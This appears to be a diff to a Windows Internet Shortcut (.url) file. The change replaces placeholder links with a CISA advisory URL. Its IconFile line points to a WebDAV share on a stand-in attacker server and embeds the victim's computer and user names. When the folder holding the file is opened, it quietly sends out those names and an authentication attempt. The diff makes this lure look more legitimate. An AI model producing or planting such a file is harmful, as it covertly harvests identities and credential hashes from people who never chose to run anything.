@@ -1,5 +1,5 @@
 [InternetShortcut]
-URL=whatever
-WorkingDirectory=whatever
-IconFile=\\IP OF WEBSEVER\webdav\%COMPUTERNAME%\%USERNAME%.icon
+URL=https://us-cert.cisa.gov/ics/tips/CSAR-10-114-02
+WorkingDirectory=https://us-cert.cisa.gov/ics/tips/CSAR-10-114-02
+IconFile=\\IP OF WEBSERVER\webdav\%COMPUTERNAME%\%USERNAME%.icon
 IconIndex=1
